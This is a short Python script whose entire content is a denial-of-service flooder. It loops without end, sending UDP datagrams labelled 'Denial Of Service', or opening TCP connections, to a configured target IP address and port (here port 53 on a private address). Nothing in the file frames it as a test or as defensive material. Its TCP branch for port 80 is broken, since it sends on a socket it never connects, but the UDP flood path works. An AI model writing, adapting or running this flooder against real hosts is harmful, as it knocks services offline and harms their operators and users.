import socket
import random

targets = '[192.168.3.130]'
ports = [53]
buffer_size = 1024
transmission = "UDP"
attack_message = "Denial Of Service"

# convert target string to array
targets = targets.replace("[", "")
targets = targets.replace("]", "")
targets = targets.split(",")

while True:
    if transmission == "TCP":
        target = random.choice(targets)
        port = random.choice(ports)
        try:
            if not port == 80:
                conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                conn.connect((target, port))

                data = conn.recv(buffer_size)

                conn.close()
            else:
                conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                conn.sendall(b"GET / HTTP/1.1\r\n\r\n")
                conn.close()
        except Exception as error:
            pass

    elif transmission == "UDP":
        target = random.choice(targets)
        port = random.choice(ports)
        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            conn.connect((target, port))

            conn.sendto(attack_message.encode(), (target, port))
            conn.close()
        except Exception as error:
            pass


